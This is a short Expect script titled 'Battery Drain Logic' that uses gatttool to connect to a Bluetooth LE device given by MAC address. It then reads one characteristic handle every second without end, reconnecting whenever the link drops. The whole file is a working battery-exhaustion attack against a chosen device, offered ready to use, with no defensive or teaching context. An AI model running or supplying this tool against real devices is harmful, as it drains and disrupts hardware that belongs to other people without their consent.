# Battery Drain Logic

#!/usr/bin/expect -f


# Check if the correct number of arguments are passed
if { $argc != 2 } {
    send_user "Usage: $argv0 <MAC_ADDRESS> <HANDLE>\n"
    exit 1
}

# Set variables from command line arguments
set mac_address [lindex $argv 0]
set handle [lindex $argv 1]

# Start gatttool in interactive mode
spawn gatttool -b $mac_address -I

# Function to connect to the device
proc connect_device {} {
    global mac_address
    send "connect\r"
    expect {
        "Connection successful" {
            send_user "Connection established with $mac_address\n"
        }
        "Error" {
            send_user "Connection failed, trying again...\n"
            sleep 5
            connect_device
        }
        default {
            send_user "Unexpected error, retrying...\n"
            sleep 5
            connect_device
        }
    }
}

# Connect to the device
expect "> "
connect_device

# Continuously read from characteristic handle
while 1 {
    send "char-read-hnd $handle\r"
    expect {
        "Characteristic value/descriptor: " {
            expect "> "
            # Display read data to user; assumes that the read data is on the line after 'Characteristic value/descriptor:'
            set read_data $expect_out(buffer)
            send_user "$read_data\n"
        }
        "Disconnected" {
            send_user "Device disconnected, attempting to reconnect...\n"
            connect_device
        }
        default {
            send_user "Unexpected output, attempting to continue...\n"
        }
    }
    # Optionally, add a delay here to control the rate of requests
    sleep 1
}
